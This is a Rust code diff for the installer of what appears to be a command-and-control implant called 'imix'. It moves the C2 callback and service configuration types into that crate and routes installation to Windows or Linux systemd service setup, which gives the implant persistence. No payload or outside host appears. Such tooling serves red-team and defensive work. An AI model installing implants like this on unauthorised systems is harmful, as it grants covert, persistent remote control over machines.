@@ -1,40 +1,24 @@
+extern crate imix;
+
 use clap::{App, arg};
-use serde::{Serialize, Deserialize};
 use std::fs::File;
-
-#[derive(Serialize, Deserialize, Debug)]
-struct C2Config {
-    uri: String,
-    timeout: u32,
-    priority: u8,
-    sticky: bool,
-    failsafe: bool
-}
-
-#[derive(Serialize, Deserialize, Debug)]
-struct ServiceConfig {
-    name: String,
-    description: String,
-    executable_path: String
-}
-
-#[derive(Serialize, Deserialize, Debug)]
-struct Config {
-    target_name: String,
-    callback_interval: u32,
-    callback_jitter: u32,
-    c2_configs: Vec<C2Config>,
-    service_configs: Vec<ServiceConfig>,
-}
+use std::path::Path;
 
 
 fn install(file_path: String) -> std::io::Result<()> {
     println!("Installing with {} config...", file_path);
     let config_file = File::open(file_path)?;
-    let config: Config = serde_json::from_reader(config_file)?;
-    println!("Loaded this: {:?}", config);
+    let config: imix::Config = serde_json::from_reader(config_file)?;
 
-    Ok(())
+    if cfg!(windows) {
+        return imix::windows::install(config);
+    }
+
+    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
+        return imix::linux::install(config);
+    }
+
+    unimplemented!("The current OS/Service Manager is not supported")
 }
 
 fn run() -> std::io::Result<()> {
